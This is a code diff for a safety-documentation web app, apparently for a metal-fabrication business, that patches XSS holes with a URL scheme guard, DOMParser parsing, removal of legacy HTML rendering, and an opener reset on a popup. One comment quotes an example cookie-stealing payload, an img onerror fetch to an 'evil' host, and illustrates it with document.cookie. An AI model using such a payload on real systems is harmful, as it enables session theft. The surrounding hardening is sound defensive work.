@@ -49,6 +49,30 @@
         return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
     }
 
+    // URL scheme guard. escapeHtml does NOT block javascript:/data: URLs in
+    // href/src contexts. Use this anywhere AI/Firebase data ends up in a
+    // clickable link. Returns about:blank for any non-http(s) input so the
+    // resulting <a> is harmless. Pair with escapeHtml for the attribute value.
+    function safeHttpUrl(url) {
+        if (!url) return 'about:blank';
+        try {
+            const parsed = new URL(String(url), window.location.href);
+            if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
+                return parsed.href;
+            }
+        } catch (_) {}
+        return 'about:blank';
+    }
+
+    // data: URL whitelist for image previews. Only allows the actual image
+    // MIME types we accept; rejects data:text/html, data:image/svg+xml
+    // (SVGs can carry <script>), application/*, etc.
+    function safeImageDataUrl(url) {
+        if (!url || typeof url !== 'string') return null;
+        if (/^data:image\/(jpeg|jpg|png|webp|gif);base64,/i.test(url)) return url;
+        return null;
+    }
+
     // Firebase safety — replace undefined with null recursively before any .set()/.update()
     function sanitizeForFirebase(obj) {
         if (obj === undefined) return null;
@@ -8308,9 +8332,12 @@
                     }
                 });
             } else if (historyItem.legacyHtml) {
-                const div = document.createElement('div');
-                div.innerHTML = historyItem.legacyHtml;
-                const text = div.textContent || div.innerText;
+                // Off-DOM innerHTML still triggers <img src=x onerror> and
+                // similar resource-fetch payloads during HTML parsing on
+                // modern Chromium/Firefox. Use DOMParser (parses to detached
+                // document, no resource loading) and pull textContent.
+                const parsed = new DOMParser().parseFromString(historyItem.legacyHtml, 'text/html');
+                const text = (parsed && parsed.body && parsed.body.textContent) || '';
                 const lines = doc.splitTextToSize(text.substring(0, 8000), 180);
                 lines.forEach(line => {
                     if (y > 275) { doc.addPage(); y = 20; }
@@ -9329,7 +9356,14 @@
     async function victorDownloadSDS(index) {
         const p = victorProducts[index];
         if (!p || !p.msds_url) { showToast('No SDS URL available', 'warning'); return; }
-        const url = p.msds_url;
+        // Reject anything that isn't http(s) — AI-supplied URLs could include
+        // javascript: which would execute when passed to window.open or set
+        // as <a href> in hubOpenExternalDownload.
+        const url = safeHttpUrl(p.msds_url);
+        if (url === 'about:blank') {
+            showToast('Refusing to open SDS — URL scheme not allowed', 'error');
+            return;
+        }
         const safeName = (p.name || 'SDS').replace(/[^a-zA-Z0-9_\- ]/g, '').replace(/\s+/g, '_');
         const filename = safeName + '_SDS.pdf';
         const fallbackWindow = window.open('about:blank', '_blank');
@@ -9762,7 +9796,7 @@
                     (data.msds_date && data.msds_date !== 'unknown' ? '<p style="font-size:13px;color:#aaa;margin-top:4px;">MSDS Date: ' + escapeHtml(data.msds_date) + ' <span style="color:' + (compliance === 'current' ? '#4CAF50' : compliance === 'expiring' ? '#f2994a' : '#f44336') + ';font-weight:600;">(' + compliance.toUpperCase() + ')</span></p>' : '') +
                     (data.hazard_class && data.hazard_class !== 'unknown' ? '<p style="font-size:13px;color:#aaa;">Hazard: ' + escapeHtml(data.hazard_class) + '</p>' : '') +
                     (data.signal_word && data.signal_word !== 'None' && data.signal_word !== 'unknown' ? '<p style="font-size:13px;color:#f2994a;font-weight:600;">⚠ Signal Word: ' + escapeHtml(data.signal_word) + '</p>' : '') +
-                    (found ? '<a href="' + escapeHtml(data.msds_url) + '" target="_blank" style="display:inline-block;margin-top:10px;padding:8px 16px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:8px;color:#fff;text-decoration:none;font-size:13px;">📄 Open MSDS PDF</a>' : '<p style="color:#f44336;margin-top:8px;">MSDS not found online. Try a different name or upload manually.</p>') +
+                    (found ? '<a href="' + escapeHtml(safeHttpUrl(data.msds_url)) + '" target="_blank" rel="noopener noreferrer" style="display:inline-block;margin-top:10px;padding:8px 16px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:8px;color:#fff;text-decoration:none;font-size:13px;">📄 Open MSDS PDF</a>' : '<p style="color:#f44336;margin-top:8px;">MSDS not found online. Try a different name or upload manually.</p>') +
                     '<br><button onclick="victorSaveResult()" style="margin-top:10px;padding:8px 16px;background:linear-gradient(135deg,#4CAF50,#45a049);border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:13px;">' + saveLabel + '</button>' +
                     '</div>';
 
@@ -10808,7 +10842,18 @@
             data.plant_equipment.length ||
             data.emergency_rescue_plans.length
         );
-        if (!hasStructuredBody && record.legacyHtml) return record.legacyHtml;
+        // Removed legacy HTML rendering — was a migration crutch that allowed
+        // cross-device persistent XSS via Firebase: any approved device could
+        // push `{html: "<img onerror=fetch('//evil/'+document.cookie)>"}` to
+        // a SWMS record and every other device viewing it would execute the
+        // payload (rendered via innerHTML on line ~10985 and document.write
+        // on line ~11942). If you have legacy SWMS records that relied on
+        // this path, rebuild them via the structured data path.
+        if (!hasStructuredBody && record.legacyHtml) {
+            return '<div style="padding:20px;color:#888;font-style:italic;">' +
+                'This SWMS was created in an older format and is not safely renderable. ' +
+                'Please regenerate it from the original job description.</div>';
+        }
 
         const workerProfiles = prepared.workerProfiles;
         const highRiskRows = frankBuildGridRows(FRANK_HOUSE_MODEL.highRiskCategories, 3, 6);
@@ -11934,6 +11979,10 @@
             showToast('Popup blocked - allow popups to continue', 'warning');
             return false;
         }
+        // Break the opener back-reference so anything in the popup can't
+        // touch window.opener.localStorage (API keys, Drive tokens) even
+        // if a future bug lets attacker-controlled HTML reach the write.
+        try { printWindow.opener = null; } catch (e) {}
         printWindow.document.write('<html><head><title>SWMS - J&M Artsteel</title>' +
             '<style>body{font-family:Arial,sans-serif;background:#fff;color:#000;padding:20px;} ' +
             'table{width:100%;border-collapse:collapse;} th,td{border:1px solid #ccc;padding:8px;text-align:left;font-size:12px;} ' +
